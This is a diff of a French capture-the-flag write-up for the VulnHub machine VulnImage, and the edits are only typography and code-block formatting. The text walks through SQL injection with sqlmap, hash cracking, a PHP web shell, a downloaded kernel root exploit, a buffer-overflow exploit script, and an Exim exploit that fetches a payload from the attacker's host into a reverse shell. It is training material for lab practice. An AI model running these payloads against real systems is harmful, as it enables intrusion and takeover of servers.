@@ -8,7 +8,7 @@ Insert coin
 
 [VulnImage](http://vulnhub.com/entry/vulnimage-1,39/) est un CTF disponible sur *VulnHub* qui a été initialement créé en 2010. Ce CTF a été créé par les étudiants d'une université allemande.  
 
-Comme souvent pas d'indication ni de scénario d'attaque fournit mais uniquement un objectif qui est ici de récupérer le magazine *Phrack* (malheureusement ce n'est pas le 69, vous vous-en doutez).  
+Comme souvent pas d'indication ni de scénario d'attaque fournit, mais uniquement un objectif qui est ici de récupérer le magazine *Phrack* (malheureusement ce n'est pas le 69, vous vous-en doutez).  
 
 Un petit scan nous renvoie beaucoup d'informations donc un service inconnu sur le port 7777 :  
 
@@ -111,19 +111,19 @@ Content-Type: application/x-www-form-urlencoded
 username=default&password=%BF%27%22%28&sig=on&fname=sig.txt&submit=Submit
 ```
 
-A noter qu'aucun mécanisme de cookies n'est présent c'est pour cela que les identifiants sont demandés sur les deux scripts.  
+À noter qu'aucun mécanisme de cookies n'est présent, c'est pour cela que les identifiants sont demandés sur les deux scripts.  
 
 On remplit le formulaire en plaçant une parenthèse dans le champ du nom d'utilisateur comme *Wapiti* l'a fait et on obtient effectivement une erreur quelque peu bavarde :  
 
-```
+```sql
 SELECT * FROM blog_users WHERE poster = 'test')' AND password = ''
 You have an error in your SQL syntax; check the manual that corresponds to your
 MySQL server version for the right syntax to use near ')' AND password = ''' at line 1
 ```
 
-On pourrait facilement exploiter cette faille à la main tellement l'erreur nous aide mais on va se servir de *sqlmap* pour gagner du temps. On commence par récupérer l'utilisateur courant avec cette commande :  
+On pourrait facilement exploiter cette faille à la main tellement l'erreur nous aide, mais on va se servir de *sqlmap* pour gagner du temps. On commence par récupérer l'utilisateur courant avec cette commande :  
 
-```
+```bash
 python sqlmap.py -u "http://192.168.1.95/admin/post.php" \
 --data="month=on&date=13&year=on&username=*&password=letmein&time=07%3A08&title=default&entry=on&submit=Submit"\
 --dbms=mysql --current-user
@@ -152,14 +152,14 @@ root:6ff1f95e508abd08
 
 Ces derniers se cassent assez rapidement avec *JTR* :  
 
-```
+```console
 $ /opt/jtr/john   --format=mysql sqlmaphashes-2eH9R3.txt
 Loaded 3 password hashes with no different salts (MySQL [32/64])
 toorcon          (root@%)
 toorcon          (root)
 ```
 
-Après avoir identifié le nom de la base de données (*blogbd*) puis celui des tables (*-D blogbd--tables*) on dumpe le contenu de la table *blog\_users* contenant les infos de connexion de la webapp :  
+Après avoir identifié le nom de la base de données (`blogbd`) puis celui des tables (`-D blogbd--tables`) on dumpe le contenu de la table `blog_users` contenant les infos de connexion de la webapp :  
 
 ```
 +----+---------+-----------+
@@ -169,24 +169,24 @@ Après avoir identifié le nom de la base de données (*blogbd*) puis celui des 
 +----+---------+-----------+
 ```
 
-Le script PHP */admin/profile.php* est particulièrement intéressant car on voit qu'il permet d'agir sur le système de fichier via les paramètres *sig* et *fname* envoyés via POST.  
+Le script PHP `/admin/profile.php` est particulièrement intéressant, car on voit qu'il permet d'agir sur le système de fichier via les paramètres `sig` et `fname` envoyés via POST.  
 
-Par défaut le champ fname (qui est caché) vaut *sig.txt*. Le champ sig est un textarea qui sera le contenu de la signature.  
+Par défaut le champ `fname` (qui est caché) vaut `sig.txt`. Le champ sig est un textarea qui sera le contenu de la signature.  
 
-Le fichier de signature est retrouvable dans */profiles/blogger-sig.txt*, il est donc calculé depuis le nom d'utilisateur et la valeur de *fname* avec un tiret entre les deux.  
+Le fichier de signature est retrouvable dans `/profiles/blogger-sig.txt`, il est donc calculé depuis le nom d'utilisateur et la valeur de `fname` avec un tiret entre les deux.  
 
 Le script semble donc vulnérable à deux attaques. La première étant une lecture arbitraire des fichiers sur le disque.  
 
-Deux méthodes d'injection pour accèder au contenu d'un fichier (comme */etc/passwd*) semblent possibles :  
+Deux méthodes d'injection pour accéder au contenu d'un fichier (comme `/etc/passwd`) semblent possibles :  
 
-* Définir le nom d'utilisateur à ../../../../../../etc/passwd terminé par un octet nul. Laisser *fname* vide. Pour cela le bypass SQL se fera via le champ de mot de passe (via saisie de *' union select 1,'',''#*
-* Trouver un dossier existant sur le système qui comprends un tiret et mettre une partie dans le nom d'utilisateur, l'autre partie dans *fname*. La aussi l'injection SQL se fait via le mot de passe.
+* Définir le nom d'utilisateur à `../../../../../../etc/passwd` terminé par un octet nul. Laisser `fname` vide. Pour cela le bypass SQL se fera via le champ de mot de passe (via saisie de `' union select 1,'',''#`
+* Trouver un dossier existant sur le système qui comprend un tiret et mettre une partie dans le nom d'utilisateur, l'autre partie dans `fname`. Là aussi l'injection SQL se fait via le mot de passe.
 
 Malheureusement la première échoue, l'octet nul semble être retiré.  
 
-La seconde méthode n'est pas plus couronnée de succès sans doute à cause d'un *open\_basedir* restrictif.  
+La seconde méthode n'est pas plus couronnée de succès sans doute à cause d'un `open_basedir` restrictif.  
 
-Je vous laisse tout de même le script que j'ai écrit pour tester cette injection (qui utilise */etc/console-tools/* comme passage obligé) :  
+Je vous laisse tout de même le script que j'ai écrit pour tester cette injection (qui utilise `/etc/console-tools/` comme passage obligé) :  
 
 ```python
 import requests
@@ -205,19 +205,19 @@ r = requests.post(URL, data=data, headers=headers)
 print r.content
 ```
 
-La seconde attaque est plus simple à mettre en oeuvre. Il suffit d'être en mesure de modifier dynamiquement la valeur du champ caché *fname* en passant par exemple l'extension de .txt à .php.  
+La seconde attaque est plus simple à mettre en œuvre. Il suffit d'être en mesure de modifier dynamiquement la valeur du champ caché `fname` en passant par exemple l'extension de `.txt` à `.php`.  
 
 Cela peut se faire via l'ancien *Opera (12.60)* ou les outils de développement intégrés à *Google Chrome* via l'onglet *Eléments* (clic-droit puis *Edit attribute* sur le champ souhaité).  
 
 ![Edit attribute - Google Chrome](/assets/img/vulnimage_html.png)
 
-Comme signature on mettra un code très classique :  
+Comme signature, on mettra un code très classique :  
 
-```
+```php
 <?php system($_GET["cmd"]); ?>
 ```
 
-On a maintenant notre première backdoor à cette adresse : */profiles/blogger-sig.php?cmd=commande*  
+On a maintenant notre première backdoor à cette adresse : `/profiles/blogger-sig.php?cmd=commande`  
 
 Ensuite on rapatrie une backdoor plus évoluée avec support du terminal.  
 
@@ -226,7 +226,7 @@ K is for Kernel, L is for Linux, O is for Old, P is for Pwnable
 
 Tentons d'obtenir un accès root. Le kernel est ancien (2.6.8-2-386) donc ça devrait être aisé. On trouve [un exploit pour une faille dans sock\_sendpage](http://www.exploit-db.com/exploits/9479/) qui fait l'affaire :  
 
-```
+```console
 sh-2.05b$ wget -O socksend.c http://www.exploit-db.com/download/9479
 --08:41:48--  http://www.exploit-db.com/download/9479
            => `socksend.c'
@@ -271,28 +271,28 @@ sh-2.05b# locate -i phrack
 /home/testuser/stuff/phrack67.tar.gz
 ```
 
-Mission accomplie, on a notre trophée mais on n'a pas fait dans le fait maison.  
+Mission accomplie, on a notre trophée, mais on n'a pas fait dans le fait maison.  
 
 Old dog, Old tricks
 -------------------
 
 Voyons quel est le chemin officiel de terminer ce CTF.  
 
-Dans les processus on trouve un exécutable nommé *buffd* qui tourne en tant que root et écoute sur le port 7777 vu en début d'article.  
+Dans les processus, on trouve un exécutable nommé `buffd` qui tourne en tant que root et écoute sur le port 7777 vu en début d'article.  
 
 ```
 root      3729  0.0  0.1  1556  504 ?        S    07:03   0:00 /usr/local/sbin/buffd
 ```
 
-La commande *file* nous retourne les informations suivantes :  
+La commande `file` nous retourne les informations suivantes :  
 
 ```
 buffd: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.8, not stripped
 ```
 
-On analyse le binaire avec radare2 (commandes *aa* puis *pdf@sym.main*) :  
+On analyse le binaire avec `radare2` (commandes `aa` puis `pdf@sym.main`) :  
 
-```
+```nasm
 |      |    ; CODE (CALL) XREF from 0x080487a4 (fcn.0804879a)
 |      |    0x08048c95    e80afbffff   call sym.imp.accept
 |      |       sym.imp.accept()
@@ -328,9 +328,9 @@ On analyse le binaire avec radare2 (commandes *aa* puis *pdf@sym.main*) :
 | ========< 0x08048d06    0f853a010000 jne 0x8048e46
 ```
 
-Du très classique avec un bind / listen / accept / fork... Voyons ce qu'on a plus loin.  
+Du très classique avec un `bind` / `listen` / `accept` / `fork`... Voyons ce qu'on a plus loin.  
 
-```
+```nasm
 |      |    0x08048d61    c744240c000. mov dword [esp+0xc], 0x0
 |      |    0x08048d69    89442408     mov [esp+0x8], eax
 |      |    0x08048d6d    8d858cfeffff lea eax, [ebp-0x174]
@@ -362,11 +362,11 @@ Du très classique avec un bind / listen / accept / fork... Voyons ce qu'on a pl
 |      |    0x08048dc5    e8cafbffff   call sym.vulnerable
 ```
 
-Le programme envoie une chaîne au client, en reçoit une puis la passe à une fonction baptisée... *vulnerable* (le binaire n'est pas stripé).  
+Le programme envoie une chaîne au client, en reçoit une, puis la passe à une fonction baptisée... `vulnerable` (le binaire n'est pas stripé).  
 
-Mystère mystère, que peut donc bien faire cette fonction ?  
+Mystère, mystère, que peut donc bien faire cette fonction ?  
 
-```
+```nasm
 [0x080488e0]> pdf@sym.vulnerable
 |          ; CODE (CALL) XREF from 0x08048dc5 (unk)
 / (fcn) sym.vulnerable 29
@@ -383,11 +383,11 @@ Mystère mystère, que peut donc bien faire cette fonction ?
 \          0x080489b0    c3           ret
 ```
 
-Surprise ! Un classique buffer-overflow via l'utilisation de *strcpy*. Le buffer réservé sur la pile est de 136 octets.  
+Surprise ! Un classique buffer-overflow via l'utilisation de `strcpy`. Le buffer réservé sur la pile est de 136 octets.  
 
-En plus l'ASRL n'est pas activé car les adresses des librairies sont les même d'une exécution à l'autre :  
+En plus l'ASRL n'est pas activé, car les adresses des librairies sont les mêmes d'une exécution à l'autre :  
 
-```
+```console
 sh-2.05b# ldd /bin/cat
         linux-gate.so.1 =>  (0xffffe000)
         libc.so.6 => /lib/libc.so.6 (0x40022000)
@@ -398,11 +398,11 @@ sh-2.05b# ldd /bin/cat
         /lib/ld-linux.so.2 (0x40000000)
 ```
 
-Afin de tester l'exploitation de cette vulnérabilité on va récupérer l'exécutable sur notre système puis le soumettre à *gdb*.  
+Afin de tester l'exploitation de cette vulnérabilité, on va récupérer l'exécutable sur notre système puis le soumettre à `gdb`.  
 
-Comme le programme fork() à chaque client il est préférable de se connecter d'abord via *ncat* puis retrouver le pid du processus fils via *pstree -p* et enfin attacher le processus dans *gdb*.  
+Comme le programme `fork()` à chaque client, il est préférable de se connecter d'abord via `ncat` puis retrouver le pid du processus fils via `pstree -p` et enfin attacher le processus dans `gdb`.  
 
-Comme le process se met en pause au rattachement on le remet en marche via *'c'* ou *'continue'* puis on envoie une chaîne de test (un max de A par exemple) :  
+Comme le process se met en pause au rattachement, on le remet en marche via `c` ou `continue` puis on envoie une chaîne de test (un max de A par exemple) :  
 
 ```
 (gdb) attach 10340
@@ -434,7 +434,7 @@ fs             0x0      0
 gs             0x63     99
 ```
 
-On a bien le contrôle sur EIP. Que se passe t-il si on varie un peu les caractères ?  
+On a bien le contrôle sur EIP. Que se passe-t-il si on varie un peu les caractères ?  
 
 On envoie le résultat de la commande Python suivante :  
 
@@ -473,19 +473,19 @@ gs             0x63     99
 0xfffc0c90:     0x41414141
 ```
 
-On voit qu'il faut 124 caractères avant d'écraser l'adresse de retour. On remarque aussi que *eax* contient une adresse qui pointe idéalement vers le début de notre buffer :)  
+On voit qu'il faut 124 caractères avant d'écraser l'adresse de retour. On remarque aussi que `eax` contient une adresse qui pointe idéalement vers le début de notre buffer :)  
 
-On va donc chercher un gadget dans le binaire du type *jmp eax* ou *call eax* qui nous donnera un point de relais stable vers notre shellcode. *objdump* à la rescousse !  
+On va donc chercher un gadget dans le binaire du type `jmp eax` ou `call eax` qui nous donnera un point de relais stable vers notre shellcode. `objdump` à la rescousse !  
 
-```
-objdump -d buffd | egrep '.*call.*eax$'
+```console
+$ objdump -d buffd | egrep '.*call.*eax$'
  804898f:       ff d0                   call   *%eax
  8048efb:       ff d0                   call   *%eax
 ```
 
 Bingo !  
 
-On écrit un petit exploit qui utilise un shellcode trouvé sur *shell-storm*. [Le shellcode utilisé ici](http://shell-storm.org/shellcode/files/shellcode-590.php) change simplement les droits sur */etc/shadow*.  
+On écrit un petit exploit qui utilise un shellcode trouvé sur *shell-storm*. [Le shellcode utilisé ici](http://shell-storm.org/shellcode/files/shellcode-590.php) change simplement les droits sur `/etc/shadow`.  
 
 ```python
 import socket
@@ -508,7 +508,7 @@ s.close()
 
 Qu'est-ce que ça donne ?  
 
-```
+```console
 $ ls -l /etc/shadow
 -rw-r----- 1 root shadow 719 2014-04-13 12:35 /etc/shadow
 $ python sploit.py 
@@ -521,10 +521,10 @@ Pwned again.
 Exim4, l'autre pays du pwnage
 -----------------------------
 
-Quels étaient les autres moyens d'arriver à ses fins ? Je n'ai trouvé rien d'intéressant via le Samba, en revanche [un exploit de KingCope pour Exim](http://www.exploit-db.com/exploits/15725/) permet d'obtenir un shell :  
+Quels étaient les autres moyens d'arriver à ses fins ? Je n'ai trouvé rien d'intéressant via Samba, en revanche [un exploit de KingCope pour Exim](http://www.exploit-db.com/exploits/15725/) permet d'obtenir un shell :  
 
-```
-> perl kingcope_exim.pl 192.168.1.95 http://192.168.1.3:8000/dc.pl 192.168.1.3 8888 
+```console
+$ perl kingcope_exim.pl 192.168.1.95 http://192.168.1.3:8000/dc.pl 192.168.1.3 8888 
 220 localhost.localdomain ESMTP Exim 4.50 Sun, 13 Apr 2014 17:58:03 +0200
 250-localhost.localdomain Hello abcde.com [192.168.1.3]
 250-SIZE 52428800
@@ -539,10 +539,10 @@ Sending large buffer, please wait...
 250 OK
 ```
 
-On aura préalablement mis en place un *SimpleHTTPServer* ainsi qu'un *ncat* :  
+On aura préalablement mis en place un `SimpleHTTPServer` ainsi qu'un `ncat` :  
 
-```
-> ncat -l -p 8888 -v
+```console
+$ ncat -l -p 8888 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Listening on :::8888
 Ncat: Listening on 0.0.0.0:8888
